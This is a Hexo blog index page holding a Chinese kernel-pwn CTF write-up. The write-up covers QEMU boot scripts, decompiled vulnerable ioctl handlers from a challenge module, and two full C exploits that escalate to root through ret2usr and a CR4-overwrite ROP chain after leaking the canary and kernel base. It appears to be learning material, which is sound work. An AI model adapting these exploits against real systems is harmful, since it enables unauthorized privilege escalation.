<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="我的博客">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="我的博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/08/kernelpwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-md/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/08/kernelpwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-md/" class="post-title-link" itemprop="url">kernelpwn刷题记录.md</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-04-08 17:19:04 / 修改时间：17:19:26" itemprop="dateCreated datePublished" datetime="2022-04-08T17:19:04+08:00">2022-04-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernelpwn刷题记录"><a href="#kernelpwn刷题记录" class="headerlink" title="kernelpwn刷题记录"></a>kernelpwn刷题记录</h1><h2 id="0x1-level1"><a href="#0x1-level1" class="headerlink" title="0x1 level1"></a>0x1 level1</h2><h3 id="0x1-1-boot-sh"><a href="#0x1-1-boot-sh" class="headerlink" title="0x1.1 boot.sh"></a>0x1.1 boot.sh</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">stty intr ^]</span><br><span class="line"><span class="built_in">cd</span> `dirname <span class="variable">$0</span>`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&#x27;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&#x27;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>noksalr,nosmep,nosmap</p>
<h3 id="0x1-2-init"><a href="#0x1-2-init" class="headerlink" title="0x1.2 init"></a>0x1.2 init</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">echo &quot;IF8gIF9fICAgICAgICAgICAgICAgXyAgICAgICAgICBfICAgICAKfCB8LyAvX19fICBfX18gXyBfXyB8IHwgICAgX18gX3wgfF9fICAKfCAnIC8vIF8gXC8gXyBcICdfIFx8IHwgICAvIF9gIHwgJ18gXCAKfCAuIFwgIF9fLyAgX18vIHwgfCB8IHxfX3wgKF98IHwgfF8pIHwKfF98XF9cX19ffFxfX198X3wgfF98X19fX19cX18sX3xfLl9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK&quot; | base64 -d</span><br><span class="line"></span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/baby.ko</span><br><span class="line">chmod 644 /dev/baby</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line"></span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>没有对proc/kallsyms保护</p>
<h3 id="0x1-3-baby-ko"><a href="#0x1-3-baby-ko" class="headerlink" title="0x1.3 baby.ko"></a>0x1.3 baby.ko</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_0</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD v5[<span class="number">17</span>]; <span class="comment">// [rsp-88h] [rbp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0x6001</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v5[<span class="number">16</span>] = v2;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)copy_from_user(v5, v3, <span class="number">256LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有栈溢出，直接ret2usr,使用kallsyms查看函数地址的时候发现地址全为0，百度后发现是内核的一种保护措施，只有root用户能够直接查看kallsyms，所以本地调试的时候把用户权限改大就好</p>
<p>提取vmlinux的命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">/usr/src/linux-headers-$</span><span class="bash">(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span></span><br><span class="line">objdump -d vmlinux &gt; gadget</span><br></pre></td></tr></table></figure>

<h3 id="0x1-4-exp"><a href="#0x1-4-exp" class="headerlink" title="0x1.4 exp"></a>0x1.4 exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0xffffffff810b9d80</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0xffffffff810b99d0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_power</span><span class="params">()</span></span>&#123;</span><br><span class="line">     (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_pop_rbp_ret=<span class="number">0xffffffff81070834</span>;</span><br><span class="line">    <span class="keyword">size_t</span> iretq=<span class="number">0xffffffff81036a5b</span>;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[<span class="number">17</span>]=(<span class="keyword">size_t</span>)up_power;</span><br><span class="line">    rop[<span class="number">18</span>]=swapgs_pop_rbp_ret;</span><br><span class="line">    rop[<span class="number">20</span>]=iretq;</span><br><span class="line">    rop[<span class="number">21</span>]=(<span class="keyword">size_t</span>)usr_shell;</span><br><span class="line">    rop[<span class="number">22</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">23</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">24</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">25</span>] = user_ss;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] bad open\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd,<span class="number">0x6001</span>,rop);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(pwn) gid=1000 groups=1000</span><br><span class="line">/ $ ./exp</span><br><span class="line">[*]status has ben saved.</span><br><span class="line">/ # id</span><br><span class="line">uid=0(root) gid=0</span><br></pre></td></tr></table></figure>

<h3 id="0x1-5-问题"><a href="#0x1-5-问题" class="headerlink" title="0x1.5 问题"></a>0x1.5 问题</h3><p>使用<code>add-symbol-file baby.ko 0x0</code>并不能断成功ko文件的函数，此时我们可以使用<code>lsmod</code>得知ko文件的首地址，然后利用具体地址断点，而不是通过函数名</p>
<h2 id="0x2-level2"><a href="#0x2-level2" class="headerlink" title="0x2 level2"></a>0x2 level2</h2><h3 id="0x2-1-boot-sh"><a href="#0x2-1-boot-sh" class="headerlink" title="0x2.1 boot.sh"></a>0x2.1 boot.sh</h3><p>难度升级，开起了smep,smap和kaslr,为了方便调试先关闭kaslr.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">stty intr ^]</span><br><span class="line">cd `dirname $0`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="0x2-2-ko文件保护"><a href="#0x2-2-ko文件保护" class="headerlink" title="0x2.2 ko文件保护"></a>0x2.2 ko文件保护</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.ko</span><br><span class="line">[*] &#x27;/home/rootzhang/kernelstudy/pwnstudy/level2/baby.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>比原来多了canary保护</p>
<h3 id="0x2-3-baby-ko"><a href="#0x2-3-baby-ko" class="headerlink" title="0x2.3 baby.ko"></a>0x2.3 baby.ko</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_0</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD v5[<span class="number">18</span>]; <span class="comment">// [rsp-90h] [rbp-90h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v5[<span class="number">17</span>] = v2;</span><br><span class="line">  v5[<span class="number">16</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">24577</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)copy_from_user(v5, v3, <span class="number">512LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">24578</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)copy_to_user(v3, v5, <span class="number">512LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在泄露和溢出，具体思路就是先泄露canary和内核地址，然后再溢出完成提权，提权有两种思路，一个方式是改变smep和smap的标志位然后ret2usr,一种方式是直接rop</p>
<h3 id="0x2-4-exp"><a href="#0x2-4-exp" class="headerlink" title="0x2.4 exp"></a>0x2.4 exp</h3><p>我采用的是更改cr4完成commits(prepare_kernel_cred(0))完成提权。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds_offset=<span class="number">0xb99d0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_offset=<span class="number">0xb9d80</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_power</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds=vmlinux_base_addr+commit_creds_offset;</span><br><span class="line">    <span class="keyword">size_t</span> prepare_kernel_cred=vmlinux_base_addr+prepare_kernel_cred_offset;</span><br><span class="line">     (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x6002</span>,buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary=buf[<span class="number">16</span>];</span><br><span class="line">    vmlinux_base_addr=buf[<span class="number">9</span>]<span class="number">-0x29b078</span>;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_pop_rbp_ret=vmlinux_base_addr+<span class="number">0xffffffff81070834</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">size_t</span> itretq=vmlinux_base_addr+<span class="number">0xffffffff81036a5b</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">size_t</span> mov_cr4_pop_rbp_ret=vmlinux_base_addr+<span class="number">0xffffffff81020300</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi_rbx=vmlinux_base_addr+<span class="number">0xffffffff81087c99</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">16</span>;</span><br><span class="line">    rop[i++]=canary;</span><br><span class="line">    i++;</span><br><span class="line">    rop[i++]=pop_rdi_rbx;</span><br><span class="line">    rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++]=mov_cr4_pop_rbp_ret;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)up_power;</span><br><span class="line">    rop[i++]=swapgs_pop_rbp_ret;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=itretq;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)usr_shell;</span><br><span class="line">    rop[i++]=user_cs;</span><br><span class="line">    rop[i++]=user_rflags;</span><br><span class="line">    rop[i++]=user_sp;</span><br><span class="line">    rop[i++]=user_ss;</span><br><span class="line">    ioctl(fd,<span class="number">0x6001</span>,rop);</span><br></pre></td></tr></table></figure>

